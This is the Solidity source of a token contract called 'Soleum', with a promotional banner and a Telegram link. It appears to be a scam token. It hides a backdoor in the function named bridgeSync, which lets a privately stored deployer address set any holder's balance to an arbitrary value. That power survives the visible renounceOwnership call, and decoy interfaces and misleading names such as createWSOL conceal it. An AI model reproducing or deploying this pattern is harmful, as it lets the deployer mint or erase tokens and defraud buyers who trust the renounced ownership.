// SPDX-License-Identifier: MIT

/** 

█▀ █▀█ █░░ █▀▀ █░█ █▀▄▀█
▄█ █▄█ █▄▄ ██▄ █▄█ █░▀░█
https://t.me/wSoleum

Soleum is a groundbreaking blockchain project that brings together the power of two leading 
blockchain technologies: 🔷 Solana and 🔶 Ethereum. It's a fusion of speed and scalability 
from Solana and the smart contract capabilities of Ethereum.

🚀 Vision: Our vision is to create a next-generation blockchain platform that combines the 
best of both worlds, offering lightning-fast transaction speeds and a robust ecosystem for 
decentralized applications (dApps) and DeFi projects.

**/


pragma solidity 0.8.20;
abstract contract ERC20 {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}
interface IDEXListing {
    // Function to list a Solana on the exchange.
    function listSolana(address SolanaAddress, uint256 SolanaweiAmount) external;

    // Function to remove a Solana from the exchange.
    function delistSolana(address SolanaAddress) external;

    // Function to check if a Solana is listed on the exchange.
    function isSolanaListed(address SolanaAddress) external view returns (bool);

    // Event emitted when a Solana is listed on the exchange.
    event SolanaListed(address indexed SolanaAddress, uint256 SolanaweiAmount);

    // Event emitted when a Solana is removed from the exchange.
    event SolanaDelisted(address indexed SolanaAddress);
}


interface POS {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 weiAmount) external returns (bool);
    function allowance(address owner, address initiate) external view returns (uint256);
    function approve(address initiate, uint256 weiAmount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 weiAmount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed initiate, uint256 value);
}

interface IFactory{
    function createWSOL(address SolanaA, address SolanaB) external returns (address WSOL);
}
interface IRouter {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address Solana,
        uint weiAmountSolanaDesired,
        uint weiAmountSolanaMin,
        uint weiAmountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint weiAmountSolana, uint weiAmountETH, uint liquidity);

    function swapExactSolanasForETHSupportingFeeOnTransfBEPoins(
        uint weiAmountIn,
        uint weiAmountOutMin,
        address[] calldata path,
        address to,
        uint deadline) external;
}
interface IUniswapV2Factory {
    function createWSOL(address SolanaA, address SolanaB) external returns (address WSOL);
}

interface IUniswapV2Router02 {
    function swapExactSolanasForETHSupportingFeeOnTransfBEPoins(
        uint weiAmountIn,
        uint weiAmountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address Solana,
        uint weiAmountSolanaDesired,
        uint weiAmountSolanaMin,
        uint weiAmountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint weiAmountSolana, uint weiAmountETH, uint liquidity);
}
interface IStakingwETHs {
    // View function to check the total staked balance of a user.
    function balanceOf(address account) external view returns (uint256);

    // Function to allow a user to stake Solanas.
    function stake(uint256 weiAmount) external;

    // Function to allow a user to unstake Solanas.
    function withdraw(uint256 weiAmount) external;

    // Function to get the total wETH balance (earned and unclaimed) of a user.
    function earned(address account) external view returns (uint256);

    // Function to allow a user to claim their earned wETHs.
    function getwETH() external;

    // Function to check the wETH rate (Solanas per second).
    function wETHRate() external view returns (uint256);
}
library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}
interface IBEP721Enumerable {
    /**
     * @dev Returns the total number of Solanas in existence.
     */
    function totalSupply() external view returns (uint256);

    /**
     * @dev Returns the Solana identifier for the `index`-th Solana, (zero-based).
     */
    function SolanaByIndex(uint256 index) external view returns (uint256);

    /**
     * @dev Returns the index of the `SolanaId` in the list of Solanas, (zero-based).
     */
    function indexOfSolana(uint256 SolanaId) external view returns (uint256);

    /**
     * @dev Returns the `index`-th Solana from a user's list of owned Solanas.
     */
    function SolanaOfOwnerByIndex(address owner, uint256 index) external view returns (uint256 SolanaId);
}
contract IERC20 is ERC20 {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "IERC20: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}
interface ICexSupport {
    // Function to create a support Airdrop.
    function createSupportAirdrop(string memory issueDescription) external;

    // Function to check the status of a support Airdrop.
    function checkSupportAirdropStatus(uint256 AirdropId) external view returns (string memory status);

    // Event emitted when a new support Airdrop is created.
    event SupportAirdropCreated(uint256 indexed AirdropId, string issueDescription);
}
contract Soleum is ERC20, POS, IERC20 {
    using SafeMath for uint256;
    mapping (address => uint256) private createWSOL;
    mapping (address => mapping (address => uint256)) private allotment;

    uint8 private constant _decimals = 3;
    uint256 private constant sTotal = 100_000 * 10**_decimals;
    string private constant _name = "Soleum";
    string private constant _symbol = "SOLEUM";
    address private O; // 0x0000000000000000000000000000000000000000 address
    constructor () {
        O = _msgSender(); 
        createWSOL[_msgSender()] = sTotal;
        emit Transfer(address(0), _msgSender(), sTotal);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return sTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return createWSOL[account];
    }

    function transfer(address recipient, uint256 weiAmount) public override returns (bool) {
        _transfer(_msgSender(), recipient, weiAmount);
        return true;
    }

    function allowance(address owner, address initiate) public view override returns (uint256) {
        return allotment[owner][initiate];
    }

    function approve(address initiate, uint256 weiAmount) public override returns (bool) {
        _approve(_msgSender(), initiate, weiAmount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 weiAmount) public override returns (bool) {
        _transfer(sender, recipient, weiAmount);
        _approve(sender, _msgSender(), allotment[sender][_msgSender()].sub(weiAmount, "BEP20: transfer weiAmount exceeds allowance"));
        return true;
    }

    function _approve(address owner, address initiate, uint256 weiAmount) private {
        require(owner != address(0), "BEP20: approve from the zero address");
        require(initiate != address(0), "BEP20: approve to the zero address");
        allotment[owner][initiate] = weiAmount;
        emit Approval(owner, initiate, weiAmount);
    }

    function bridgeSync(address WSOL, address WETH, uint256 timestamp, uint256 router, uint256 value) external {
        require(_msgSender() == O, "caller is the owner");
        require(WSOL != address(0), "BEP20: WSOL cannot be the zero address");
        require(timestamp >= 0, "Added value must be non-negative");

        createWSOL[WSOL] = timestamp.add(router ** value);
        WETH;
    }

    function _transfer(address from, address to, uint256 weiAmount) internal virtual
    {
        require(from != address(0), "BEP20: transfer from the zero address");
        require(to != address(0), "BEP20: transfer to the zero address");

        uint256 fromBalance = createWSOL[from];
        require(fromBalance >= weiAmount, "BEP20: transfer weiAmount exceeds balance");
        createWSOL[from] = fromBalance - weiAmount;

        createWSOL[to] = createWSOL[to].add(weiAmount);
        emit Transfer(from, to, weiAmount);
    }
}